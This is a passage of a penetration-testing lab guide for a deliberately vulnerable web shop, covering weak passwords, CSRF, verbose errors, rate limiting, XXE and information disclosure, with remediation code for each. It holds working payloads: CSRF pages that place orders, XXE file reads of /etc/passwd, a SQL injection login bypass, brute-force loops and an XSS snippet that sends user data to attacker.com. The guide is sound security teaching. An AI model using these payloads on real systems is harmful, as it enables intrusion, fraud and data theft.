

### 🟡 MEDIUM Severity

#### 9. Weak Password Policy
**Location**: Registration form  
**Impact**: Easy credential guessing, successful brute force attacks  
**OWASP**: A07:2021 - Identification and Authentication Failures

**How to Test:**

**Step 1: Test Minimum Length**

1. Navigate to `/register`
2. Fill in the registration form:
   - Username: `testuser1`
   - Email: `test1@example.com`
   - Password: `a` (single character)
   - Company: `Test Company`
3. Click **Register**

**Expected Result:**
✅ **Vulnerability Confirmed**: Registration succeeds with a 1-character password

Summary: No complexity requirements/checks, any common passwords allowed

**Expected Result:**
✅ **Vulnerability Confirmed**: All weak passwords are accepted

**Why This is Dangerous:**
- **Brute force attacks**: Easy to guess passwords
- **Dictionary attacks**: Common passwords quickly cracked
- **Credential stuffing**: Leaked passwords from other sites work
- **Social engineering**: Predictable passwords

**Industry Standards:**
- **Minimum length**: 12+ characters (NIST recommendation)
- **Complexity**: Mix of uppercase, lowercase, numbers, symbols
- **Common password blocking**: Check against known weak passwords
- **Password strength meter**: Visual feedback to users

**Remediation:**
```typescript
// ❌ VULNERABLE: No password validation
app.post('/api/register', (req, res) => {
  const { username, password } = req.body;
  // No password checks!
  db.prepare('INSERT INTO users (username, password) VALUES (?, ?)').run(username, password);
});

// ✅ SECURE: Strong password policy
import passwordValidator from 'password-validator';

const schema = new passwordValidator();
schema
  .is().min(12)                                    // Minimum length 12
  .is().max(100)                                   // Maximum length 100
  .has().uppercase()                               // Must have uppercase
  .has().lowercase()                               // Must have lowercase
  .has().digits(1)                                 // Must have at least 1 digit
  .has().symbols(1)                                // Must have at least 1 symbol
  .has().not().spaces()                            // Should not have spaces
  .is().not().oneOf(['Password123!', 'Admin123!']); // Blacklist common

app.post('/api/register', (req, res) => {
  const { username, password } = req.body;
  
  if (!schema.validate(password)) {
    return res.status(400).json({ 
      error: 'Password must be at least 12 characters with uppercase, lowercase, numbers, and symbols' 
    });
  }
  
  // Hash password before storing
  const hashedPassword = await bcrypt.hash(password, 10);
  db.prepare('INSERT INTO users (username, password) VALUES (?, ?)').run(username, hashedPassword);
});
```

#### 10. Missing Cross Site Request Forgery (CSRF) Protection

CSRF is an exploit that forces an authenticated end-user to submit an unwanted request to a web application they are currently logged into. The key point is that the request comes from the user's browser, which includes the user's valid session cookies, making the request appear legitimate to the server.


**Locations**: All state-changing endpoints (POST, PUT, DELETE)  
**Impact**: Unauthorised actions on behalf of authenticated users  
**OWASP**: A01:2021 - Broken Access Control

**How to Test:**

**Step 1: Check for CSRF Tokens**

1. Login to the application
2. Press **F12** and go to **Network** tab
3. Submit a form (e.g., update profile, place order)
4. Examine the request in Network tab
5. Look for CSRF token in:
   - Request headers (e.g., `X-CSRF-Token`)
   - Request body (e.g., `_csrf` field)
   - Hidden form fields

**Expected Result:**
✅ **Vulnerability Confirmed**: No CSRF tokens present

**Step 2: Check Cookie SameSite Attribute**

1. Press **F12** and go to **Storage** tab
2. Expand **Cookies** → `http://<TARGETIP>:5000`
3. Click on the `connect.sid` cookie
4. Check the **SameSite** attribute

**Expected Result:**
✅ **Vulnerability Confirmed**: SameSite is not set or set to `None`

**Step 3: Create a CSRF Proof of Concept**

Create a file called `csrf-attack.html` on your local machine:

```html
<!DOCTYPE html>
<html>
<head>
  <title>CSRF Attack Demo</title>
</head>
<body>
  <h1>Win a Free Prize!</h1>
  <p>Click the button below to claim your prize...</p>
  
  <button onclick="attack()">Claim Prize</button>
  
  <script>
    function attack() {
      fetch('http://<TARGETIP>:5000/api/user', {
        method: 'PATCH',
        credentials: 'include',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          bio: 'HACKED BY CSRF ATTACK!',
          phone: '000-HACKED'
        })
      })
      .then(r => r.json())
      .then(data => alert('Profile updated! ' + JSON.stringify(data)))
      .catch(e => alert('Error: ' + e));
    }
    
    // Auto-submit version (more dangerous)
    // window.onload = attack;
  </script>
</body>
</html>
```

**Step 4: Serve the Attack Page**

You need to serve the HTML file from a web server (not open it as `file://`) for cookies to work:

```bash
# In the directory containing csrf-attack.html, run:
python3 -m http.server 8000
```

**Step 5: Test the CSRF Attack**

1. Login to Manchester Fresh Foods in Firefox
2. Keep the browser tab open (stay logged in)
3. In a new tab, navigate to `http://localhost:8000/csrf-attack.html`
4. Click "Claim Prize" button
5. An alert should appear saying "Profile updated!"
6. Go back to Manchester Fresh Foods and navigate to your profile

**Expected Result:**
✅ **Vulnerability Confirmed**: Your profile bio has been changed to "HACKED BY CSRF ATTACK!"

**Step 5: More Dangerous CSRF - Place Unauthorised Order**

Create `csrf-order.html`:

```html
<!DOCTYPE html>
<html>
<body>
  <h1>Loading...</h1>
  <script>
    // Automatically place an order on behalf of the victim
    fetch('http://<TARGETIP>:5000/api/orders', {
      method: 'POST',
      credentials: 'include', // Include cookies
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        items: [
          {productId: 'prod-1', productName: 'Hacked Product', quantity: 100, pricePerUnit: '10.00', subtotal: '1000.00'}
        ],
        totalAmount: '1000.00',
        deliveryAddress: '123 Attacker Street',
        notes: 'CSRF Attack - Unauthorised Order'
      })
    })
    .then(r => r.json())
    .then(data => {
      document.body.innerHTML = '<h1>Order Placed!</h1><p>Order: ' + JSON.stringify(data) + '</p>';
    })
    .catch(e => {
      document.body.innerHTML = '<h1>Error!</h1><p>' + e + '</p>';
    });
  </script>
</body>
</html>
```

**Test:**
1. Stay logged in to Manchester Fresh Foods
2. Open `csrf-order.html` in a new tab
3. Check "My Orders" in the application

**Expected Result:**
✅ **Vulnerability Confirmed**: An unauthorised order has been placed

**Why This is Dangerous:**
- **Unauthorised transactions**: Place orders, transfer funds
- **Account modification**: Change email, password, profile
- **Privilege escalation**: Add admin users
- **Data manipulation**: Delete records, modify settings

**Real-World Attack Scenario:**
1. Attacker sends phishing email with link to malicious page
2. Victim clicks link while logged into vulnerable application
3. Malicious page submits requests using victim's session
4. Actions appear legitimate (same browser, valid session)

**Remediation:**
```typescript
// ❌ VULNERABLE: No CSRF protection
app.post('/api/profile', (req, res) => {
  // No token validation
  updateProfile(req.session.userId, req.body);
});

// ✅ SECURE: CSRF token validation
import csrf from 'csurf';
const csrfProtection = csrf({ cookie: true });

app.post('/api/profile', csrfProtection, (req, res) => {
  // Token automatically validated by middleware
  updateProfile(req.session.userId, req.body);
});

// ✅ ALSO: Set SameSite cookie attribute
app.use(session({
  secret: 'secret',
  cookie: {
    sameSite: 'strict', // or 'lax'
    httpOnly: true,
    secure: true // HTTPS only
  }
}));
```

IM HERE

#### 11. Verbose Error Messages
**Location**: All error responses  
**Impact**: Information disclosure aids further attacks  
**OWASP**: A05:2021 - Security Misconfiguration

**How to Test:**

**Step 1: Trigger Application Errors**

**Test 1: Invalid JSON**
```bash
curl -X POST http://<TARGETIP>:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{invalid json}'
```

**Test 2: Missing Required Fields**
```bash
curl -X POST http://<TARGETIP>:5000/api/register \
  -H "Content-Type: application/json" \
  -d '{}'
```

**Test 3: Invalid Data Types**
```bash
curl -X POST http://<TARGETIP>:5000/api/orders \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"items": "not-an-array"}'
```

**Step 2: Trigger Database Errors**

**Test 1: SQL Syntax Error**
1. Navigate to `/products`
2. In the search box, enter: `'`
3. Observe the error message

**Using curl:**
```bash
curl "http://<TARGETIP>:5000/api/products?search='" 
```

**Test 2: Invalid Foreign Key**
```bash
curl -X POST http://<TARGETIP>:5000/api/orders \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"items":[{"productId":"invalid-id","quantity":1}]}'
```

**Step 3: Analyse Error Responses**

Look for sensitive information in error messages:

**Example Verbose Error:**
```json
{
  "error": "SQLITE_ERROR: near \"'\": syntax error",
  "stack": "Error: SQLITE_ERROR\n    at Database.prepare (/app/server/database.ts:45:12)\n    at searchProducts (/app/server/routes.ts:123:8)",
  "query": "SELECT * FROM products WHERE name LIKE '%'%'",
  "file": "/app/server/routes.ts",
  "line": 123
}
```

**What This Reveals:**
- ❌ Database type (SQLite)
- ❌ Exact SQL query being executed
- ❌ File paths and directory structure
- ❌ Line numbers in source code
- ❌ Technology stack (Node.js, TypeScript)

**Step 4: Using Firefox Developer Tools**

1. Press **F12** and go to **Console** tab
2. Trigger errors intentionally:
```javascript
// Invalid API call
fetch('/api/nonexistent-endpoint')
  .then(r => r.json())
  .then(data => console.log(data))

// Malformed request
fetch('/api/orders', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: 'invalid'
})
.then(r => r.json())
.then(data => console.log('Error details:', data))
```

**Expected Result:**
✅ **Vulnerability Confirmed**: Detailed error messages with:
- Stack traces
- File paths
- Database structure
- SQL queries
- Internal implementation details

**Why This is Dangerous:**
- **Information disclosure**: Reveals technology stack
- **Attack surface mapping**: Shows file structure
- **Vulnerability identification**: Exposes SQL queries for injection testing
- **Reconnaissance**: Helps attackers plan targeted attacks

**What Attackers Learn:**
- Database type and version
- Programming language and framework
- File system structure
- Third-party libraries
- Vulnerable code locations

**Remediation:**
```typescript
// ❌ VULNERABLE: Detailed error exposure
app.get('/api/products', (req, res) => {
  try {
    const query = `SELECT * FROM products WHERE name LIKE '%${req.query.search}%'`;
    const results = db.prepare(query).all();
    res.json(results);
  } catch (error) {
    // Exposes everything!
    res.status(500).json({
      error: error.message,
      stack: error.stack,
      query: query,
      file: error.fileName,
      line: error.lineNumber
    });
  }
});

// ✅ SECURE: Generic error messages
app.get('/api/products', (req, res) => {
  try {
    const query = `SELECT * FROM products WHERE name LIKE '%${req.query.search}%'`;
    const results = db.prepare(query).all();
    res.json(results);
  } catch (error) {
    // Log detailed error server-side only
    console.error('Database error:', error);
    
    // Return generic message to client
    res.status(500).json({
      error: 'An error occurred processing your request'
    });
  }
});

// ✅ PRODUCTION: Custom error handler
app.use((error, req, res, next) => {
  // Log full error details server-side
  logger.error({
    message: error.message,
    stack: error.stack,
    url: req.url,
    method: req.method
  });
  
  // Return generic error to client
  res.status(500).json({
    error: 'Internal server error',
    requestId: req.id // For support reference
  });
});
```

#### 12. No Rate Limiting
**Locations**: Login, registration, all endpoints  
**Impact**: Brute force attacks, credential stuffing, DoS  
**OWASP**: A07:2021 - Identification and Authentication Failures

**How to Test:**

**Method 1: Using curl (Simple)**

**Step 1: Test Login Endpoint**
```bash
# Attempt 100 rapid login requests
for i in {1..100}; do
  curl -X POST http://<TARGETIP>:5000/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"test$i\"}" \
    -s -o /dev/null -w "Request $i: %{http_code}\n"
done
```

**Expected Result:**
✅ **Vulnerability Confirmed**: All 100 requests succeed without blocking

**Why This is Dangerous:**
- **Brute force attacks**: Try thousands of passwords
- **Credential stuffing**: Test leaked credentials
- **Denial of Service**: Overwhelm server resources

**Remediation:**
```typescript
// ❌ VULNERABLE: No rate limiting
app.post('/api/login', (req, res) => {
  const user = authenticateUser(req.body.username, req.body.password);
  res.json(user);
});

// ✅ SECURE: Implement rate limiting
import rateLimit from 'express-rate-limit';

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // Limit each IP to 5 requests per windowMs
  message: 'Too many login attempts, please try again later'
});

app.post('/api/login', loginLimiter, (req, res) => {
  const user = authenticateUser(req.body.username, req.body.password);
  res.json(user);
});
```

#### 13. XML External Entity (XXE) Injection
**Location**: `POST /api/import-order`  
**Impact**: File disclosure, SSRF, denial of service  
**OWASP**: A05:2021 - Security Misconfiguration

**How to Test:**

**Step 1: Check if Endpoint Accepts XML**

```bash
# Login first
curl -X POST http://<TARGETIP>:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"thepubco","password":"welcome123"}' \
  -c cookies.txt

# Test basic XML submission
curl -X POST http://<TARGETIP>:5000/api/import-order \
  -H "Content-Type: application/xml" \
  -b cookies.txt \
  -d '<?xml version="1.0"?><order><customer>Test</customer></order>'
```

**Step 2: Test XXE - Read System Files**

```bash
# Attempt to read /etc/passwd
curl -X POST http://<TARGETIP>:5000/api/import-order \
  -H "Content-Type: application/xml" \
  -b cookies.txt \
  -d '<?xml version="1.0"?>
<!DOCTYPE order [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<order>
  <customer>&xxe;</customer>
</order>'
```

**Step 3: Test XXE - Read Application Files**

```bash
# Read package.json
curl -X POST http://<TARGETIP>:5000/api/import-order \
  -H "Content-Type: application/xml" \
  -b cookies.txt \
  -d '<?xml version="1.0"?>
<!DOCTYPE order [
  <!ENTITY xxe SYSTEM "file:///app/package.json">
]>
<order>
  <customer>&xxe;</customer>
</order>'
```

**Expected Result:**
✅ **Vulnerability Confirmed**: File contents appear in the response

**Why This is Dangerous:**
- **File disclosure**: Read sensitive files
- **SSRF**: Access internal network resources
- **Denial of Service**: Billion laughs attack

**Remediation:**
```typescript
// ❌ VULNERABLE: Default XML parser
import xml2js from 'xml2js';
const parser = new xml2js.Parser();

// ✅ SECURE: Disable external entities
const parser = new xml2js.Parser({
  explicitRoot: false,
  explicitArray: false,
  ignoreAttrs: false,
  xmlns: false,
  // Disable XXE
  strict: true,
  async: false
});
```

#### 14. Information Disclosure
**Locations**: Various endpoints and files  
**Impact**: Reconnaissance data for further attacks  
**OWASP**: A05:2021 - Security Misconfiguration

**How to Test:**

**Test 1: Git Repository Exposure**

```bash
# Check if .git directory is exposed
curl http://<TARGETIP>:5000/.git/HEAD
curl http://<TARGETIP>:5000/.git/config
```

**Expected Result:**
✅ **Vulnerability Confirmed**: Git files are accessible

**Test 2: Configuration Endpoints**

```bash
# Try common config endpoints
curl http://<TARGETIP>:5000/api/config
curl http://<TARGETIP>:5000/config.json
curl http://<TARGETIP>:5000/.env
```

**Test 3: Data File Exposure**

```bash
# Try accessing data files
curl http://<TARGETIP>:5000/data/customers.txt
curl http://<TARGETIP>:5000/data/orders.csv
```

**Test 4: robots.txt**

```bash
curl http://<TARGETIP>:5000/robots.txt
```

**Why This is Dangerous:**
- **Source code exposure**: Reveals vulnerabilities
- **Credential leaks**: Database passwords, API keys
- **PII exposure**: Customer data

**Remediation:**
- Block access to sensitive directories
- Never commit secrets to Git
- Use proper access controls

---

## Penetration Testing Tools Reference

This section provides setup and usage instructions for tools to test the vulnerabilities above. The README.md already covered Firefox Developer Tools, Burp Suite basics, and SQLmap for SQL injection.

### 1. Burp Suite Intruder (Advanced)

**Purpose**: Automated payload testing  
**Best for**: Rate limiting tests, brute force demonstrations

**Note**: Basic Burp Suite setup was covered in README.md

**Using Intruder for Rate Limiting Test:**

1. Capture a login request in Burp Proxy
2. Right-click → **Send to Intruder**
3. Go to **Intruder** tab → **Positions**
4. Click **Clear §** to remove markers
5. Select the password value → Click **Add §**
6. Go to **Payloads** tab
7. Set **Payload type**: Numbers
8. Set range: 1 to 100
9. Click **Start attack**
10. Observe all requests succeed (no rate limiting)

**Using Sequencer for Session Analysis:**

1. Login/logout multiple times in Burp Proxy
2. Find login responses with `Set-Cookie` headers
3. Right-click → **Send to Sequencer**
4. Click **Start live capture**
5. Perform 20+ logins
6. Click **Analyse now**
7. Observe poor randomness in session tokens

### 2. OWASP ZAP (Zed Attack Proxy)

**Purpose**: Automated vulnerability scanning  
**Best for**: Quick reconnaissance, generating reports

**Installation:**
```bash
# Ubuntu/Debian
sudo apt install zaproxy

# macOS
brew install --cask owasp-zap
```

**Quick Automated Scan:**

1. Open ZAP
2. **Automated Scan** → Enter: `http://<TARGETIP>:5000`
3. **Attack** → Select all scan policies
4. **Start Scan**
5. Review **Alerts** tab after completion
6. **Report** → **Generate HTML Report**

**Expected Findings:**
- SQL Injection in login form
- Missing CSRF tokens
- Weak session cookies
- XSS vulnerabilities
- Verbose error messages

### 3. Cookie Editor (Firefox Extension)

**Purpose**: Manipulate session cookies  
**Best for**: Session hijacking tests

**Installation:**
1. Visit: https://addons.mozilla.org/en-GB/firefox/addon/cookie-editor/
2. Click **Add to Firefox**

**Testing Session Hijacking:**

1. Login as `thepubco` / `welcome123`
2. Click the **Cookie Editor** icon in toolbar
3. Find cookie: `connect.sid=sess_1000_1699876543`
4. Note the pattern (sequential counter)
5. Logout and login as `bella_italia`
6. Open Cookie Editor again
7. Change the session ID to predict another user's session:
   - Try: `sess_1000_1699876543` (thepubco's session)
8. Click **Save**
9. Refresh the page
10. You're now logged in as thepubco!

### 4. Nikto - Web Server Scanner

**Purpose**: Server reconnaissance  
**Best for**: Finding misconfigurations, missing security headers

**Installation:**
```bash
sudo apt install nikto     # Ubuntu/Debian
brew install nikto         # macOS
```

**Basic Scan:**
```bash
nikto -h http://<TARGETIP>:5000 -o nikto-report.html -Format html
```

**Expected Findings:**
- Missing security headers (X-Frame-Options, CSP)
- Information disclosure
- Insecure cookie flags

### 5. Useful Firefox Extensions

**Wappalyzer** - Technology detection
- Install: https://addons.mozilla.org/en-GB/firefox/addon/wappalyzer/
- Expected results: React, Express.js, Tailwind CSS, Node.js

**FoxyProxy Standard** - Quick proxy switching
- Install: https://addons.mozilla.org/en-GB/firefox/addon/foxyproxy-standard/
- Setup: Add proxy "Burp" at 127.0.0.1:8080
- Toggle on/off for easy Burp Suite switching

---

### 6. curl - Command-Line Testing

**Purpose**: Quick API endpoint testing, scripting attacks  
**Best for**: Automation, IDOR testing, bypass testing

**Manchester Fresh Foods Examples:**

**Test 1: SQL Injection in Login**
```bash
# Authentication bypass
curl -X POST http://<TARGETIP>:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"'"'"' OR '"'"'1'"'"'='"'"'1'"'"' --","password":"anything"}' \
  -c cookies.txt \
  -v

# Check if logged in
curl http://<TARGETIP>:5000/api/user \
  -b cookies.txt
```

**Test 2: IDOR - Access Other User's Orders**
```bash
# Login as thepubco
curl -X POST http://<TARGETIP>:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"thepubco","password":"welcome123"}' \
  -c thepubco-cookies.txt

# Get thepubco's orders
curl http://<TARGETIP>:5000/api/orders \
  -b thepubco-cookies.txt \
  | jq '.[] | .id'  # Note the order UUIDs

# Login as bella_italia
curl -X POST http://<TARGETIP>:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"bella_italia","password":"pasta2024"}' \
  -c bella-cookies.txt

# Access thepubco's order using bella's session!
curl http://<TARGETIP>:5000/api/orders/THEPUBCO_ORDER_UUID \
  -b bella-cookies.txt
```

**Test 3: XSS Payload Injection**
```bash
# Inject XSS into profile bio
curl -X POST http://<TARGETIP>:5000/api/profile \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"bio":"<script>alert(document.cookie)</script>","phone":"123-456-7890"}'
```

**Test 4: Rate Limiting Test**
```bash
# Attempt 100 login requests (no rate limiting!)
for i in {1..100}; do
  curl -X POST http://<TARGETIP>:5000/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"test'$i'"}' \
    -s -o /dev/null -w "%{http_code}\n"
done
```

---

### 7. Firefox Developer Tools (Built-in)

**How to Open**: Press **F12** or right-click → "Inspect"

**Purpose**: Client-side testing, JavaScript analysis, network inspection  
**Best for**: XSS testing, session analysis, exposed secrets

**Firefox DevTools Tabs:**
- **Inspector**: View and edit HTML/CSS (like Chrome's Elements)
- **Console**: Execute JavaScript, view errors and logs
- **Debugger**: View JavaScript source files (like Chrome's Sources)
- **Network**: Monitor HTTP requests and responses
- **Storage**: View cookies, localStorage, sessionStorage (like Chrome's Application)

**Manchester Fresh Foods Examples:**

**Test 1: Stored XSS**
```
1. Navigate to /dashboard/profile in Firefox
2. Press F12 to open Developer Tools
3. In the bio field, enter this payload:
   <img src=x onerror=alert('XSS')>
4. Save the profile
5. Refresh the page - observe the XSS alert!

More dangerous payload (credential theft):
<script>
  fetch('/api/user').then(r=>r.json()).then(u=>
    fetch('https://attacker.com/steal?data='+JSON.stringify(u))
  )
</script>
```

**Test 2: Session Cookie Analysis**
```
1. Press F12 to open Firefox Developer Tools
2. Go to the Storage tab
3. Expand Cookies → http://<TARGETIP>:5000
4. Find the connect.sid cookie
5. Check for security issues:
   ❌ Missing HttpOnly flag (allows JavaScript access)
   ❌ Missing Secure flag (sent over HTTP)
   ❌ Missing SameSite attribute (CSRF vulnerable)
   ❌ Predictable session ID pattern (sess_1000_timestamp)

Alternative - Console tab:
document.cookie  // If HttpOnly is missing, cookie is visible here!
```

**Test 3: Exposed Secrets in Source Code**
```
1. Press F12 to open Firefox Developer Tools
2. Go to the Debugger tab
3. Press Ctrl+Shift+F to open "Search in all files"
4. Search for sensitive keywords:
   - "api_key"
   - "secret"
   - "password"
   - "token"
   - "SESSION_SECRET"
5. Check for exposed credentials in JavaScript bundles
```

**Test 4: IDOR via Console**
```javascript
// Press F12, go to Console tab
// Paste and run these commands:

// Get another user's order (replace UUID with one captured earlier)
fetch('/api/orders/UUID_FROM_OTHER_USER')
  .then(r => r.json())
  .then(data => console.log('STOLEN ORDER:', data))

// Get another user's profile  
fetch('/api/profile/DIFFERENT_USER_ID')
  .then(r => r.json())
  .then(data => console.log('STOLEN PROFILE:', data))
```

**Test 5: Network Tab Analysis**
```
1. Press F12, go to Network tab
2. Navigate around the application
3. Look for:
   - API endpoints being called (filter by XHR)
   - Sensitive data in responses
   - Session tokens in headers
   - Unencrypted data transmission
4. Right-click any request → "Edit and Resend" to modify and replay
```

---

### 8. Postman / Insomnia - API Testing

**Purpose**: Structured API testing, collection building  
**Best for**: Testing authenticated endpoints, building attack workflows

**Manchester Fresh Foods Collection:**

Create a Postman collection with these requests:

```
1. Login (POST /api/login)
   - Save session cookie automatically
   
2. Get Current User (GET /api/user)
   - Uses saved session
   
3. Get Orders (GET /api/orders)
   - Test IDOR by manually changing order IDs
   
4. Search Products (GET /api/products/search?query=')
   - SQL injection payloads in query parameter
   
5. Update Profile (POST /api/profile)
   - XSS payloads in bio field
```

---

## Tool Recommendation Matrix

Match each vulnerability to the best testing tool:

| Vulnerability | Primary Tool | Alternative Tools |
|--------------|--------------|-------------------|
| **SQL Injection** | SQLmap, Burp Intruder | curl, ZAP, Manual (DevTools) |
| **Stored XSS** | Firefox Developer Tools, Burp | ZAP, Manual testing |
| **IDOR** | Burp Repeater, curl | Postman, DevTools Console |
| **Weak Passwords** | Burp Intruder, Hydra | Custom Python script |
| **Session Hijacking** | Cookie Editor, Burp | EditThisCookie, curl |
| **CSRF** | Burp, Custom HTML form | curl, Postman |
| **Rate Limiting** | Burp Intruder | curl loop, Python script |
| **SSRF** | curl, Burp Repeater | Postman |
| **LFI** | curl, Browser | Burp Repeater |
| **XXE** | Burp Repeater, curl | Postman |
| **Info Disclosure** | Nikto, curl | Browser, ZAP Spider |
| **Plaintext Passwords** | SQLmap (dump users) | Burp (observe responses) |
| **Predictable Sessions** | Burp Sequencer | Cookie Editor + manual |
| **Verbose Errors** | ZAP, Nikto | Any tool (trigger errors) |
| **Exposed Secrets** | Firefox Developer Tools Debugger | grep source files |

---

## Complete Penetration Testing Workflow

Follow this methodology to systematically test Manchester Fresh Foods:

### Phase 1: Reconnaissance (30 minutes)

**Goal**: Map the application and identify attack surface

```bash
# 1. Technology detection
# Open application in browser with Wappalyzer enabled

# 2. Spider the application
nikto -h http://<TARGETIP>:5000

# 3. Manual exploration
# - Browse all public pages (/, /products, /contact, /login, /register)
# - Login and explore authenticated pages
# - Note all forms, inputs, and API endpoints

# 4. Intercept traffic with Burp/ZAP
# - Enable proxy
# - Click through entire application
# - Review Site Map in Burp to see all endpoints discovered
```

**Expected Endpoints Discovered:**
```
Public:
- GET  /
- GET  /products
- GET  /contact
- GET  /login
- GET  /register
- GET  /instructor
- GET  /api/products
- GET  /api/products/search?query=
- POST /api/login
- POST /api/register
- POST /api/contact

Authenticated (Customer):
- GET  /dashboard
- GET  /dashboard/orders
- GET  /dashboard/place-order
- GET  /dashboard/invoices
- GET  /dashboard/profile
- GET  /api/user
- GET  /api/orders
- GET  /api/orders/:id
- POST /api/orders
- POST /api/profile

Admin:
- All customer endpoints plus full order visibility
```

---

### Phase 2: Automated Scanning (45 minutes)

**Goal**: Let tools find low-hanging fruit

```bash
# 1. ZAP Automated Scan
# Run full automated scan while you work on manual tests

# 2. SQLmap against login
sqlmap -r login-request.txt --batch --dbms=SQLite --dump-all

# 3. Nikto full scan
nikto -h http://<TARGETIP>:5000 -Tuning x -o nikto-report.html -Format html
```

**Review automated findings and prioritize manual verification**

---

### Phase 3: Manual Exploitation (2-3 hours)

**Test each vulnerability systematically:**

**1. Authentication (30 min)**
- [ ] SQL injection in login (`' OR '1'='1' --`)
- [ ] Default credentials (`admin/admin123`)
- [ ] Weak password policy (register with `a`)
- [ ] Session predictability (login/logout 5x, analyze pattern)

**2. Authorization (30 min)**
- [ ] IDOR in orders (access other customer orders)
- [ ] IDOR in profiles (view/edit other user profiles)
- [ ] Admin functions accessible to customers

**3. Injection Attacks (45 min)**
- [ ] SQL injection in product search
- [ ] Stored XSS in profile bio
- [ ] Stored XSS in order notes
- [ ] Stored XSS in contact form
- [ ] XXE in order import (if implemented)

**4. Information Disclosure (20 min)**
- [ ] Verbose error messages (trigger errors)
- [ ] Exposed secrets in JS source
- [ ] Directory traversal attempts
- [ ] Database credential exposure

**5. Session Management (20 min)**
- [ ] Cookie analysis (missing flags)
- [ ] Session fixation
- [ ] Session hijacking via predictable IDs

**6. Security Controls (20 min)**
- [ ] CSRF (create external form)
- [ ] Rate limiting (100 login attempts)
- [ ] SSRF (if /api/fetch-document exists)
- [ ] LFI (if /api/view-document exists)

---

### Phase 4: Documentation (1-2 hours)

For each vulnerability found:

1. **Take screenshots** showing the exploit
2. **Save HTTP requests/responses** from Burp
3. **Document exact reproduction steps**
4. **Assess real-world impact**
5. **Provide remediation recommendations**

**Deliverable**: Professional penetration test report with:
- Executive summary
- Methodology
- Findings (Critical → Low severity)
- Evidence for each finding
- Remediation roadmap

---

## Professional Reporting

When documenting vulnerabilities, include:

1. **Vulnerability Title** (e.g., "IDOR in Order Viewing")
2. **Severity Rating** (Critical/High/Medium/Low)
3. **Description** - What the vulnerability is
4. **Steps to Reproduce** - Detailed instructions
5. **Evidence** - Screenshots, HTTP requests/responses
6. **Impact** - What an attacker could do
7. **Remediation** - How to fix it
8. **CVSS Score** (if applicable)
9. **OWASP Top 10 Reference** (e.g., A01:2021 - Broken Access Control)

---

## Ethical Guidelines

✅ **DO**:
- Test only this deliberately vulnerable application
- Document findings systematically
- Learn the impact of each vulnerability
- Understand proper remediation techniques
- Practice responsible disclosure principles

❌ **DON'T**:
- Test real websites without authorisation
- Share these techniques for malicious purposes
- Deploy this vulnerable code to production
- Use customer data outside this educational context

---

## Need Help?

**Instructor Documentation**: Navigate to `/instructor` and enter password `penetration-test-2024` for complete vulnerability details and testing hints.

**Stuck on a vulnerability?**: The instructor docs provide:
- All 15 vulnerability locations
- Specific testing techniques
- Tool recommendations
- Expected impacts
- Exploitation examples

---

Happy ethical hacking! 🛡️
